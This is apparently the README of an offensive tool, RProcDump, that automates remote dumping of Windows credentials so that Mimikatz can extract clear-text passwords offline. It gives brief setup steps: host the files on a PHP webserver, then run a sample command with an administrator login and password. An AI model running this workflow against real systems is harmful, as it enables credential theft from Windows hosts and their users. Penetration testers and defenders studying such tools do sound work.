# RProcDump
Remote Windows credentials dump process automation. 
Can be used to dump Windows credentials remotely and later extract clear text with Mimikatz offline.

Help:
	Host all files in a webserver able to interpret PHP (apache2 on kali linux)
	Edit prameters in procdump.ps1 and run Rprocdump.ps1 with same parameters on attack machine:
	example:

#> RProcdump -server http://127.0.0.1 -login administrator -pass password123

Need local admin privileges !!!

 Author: @ThebenyGreen
  - EyesOpenSecurity
  
Credits: Mark Russinovich Sysinternals- psexec.exe and Procdump.exe
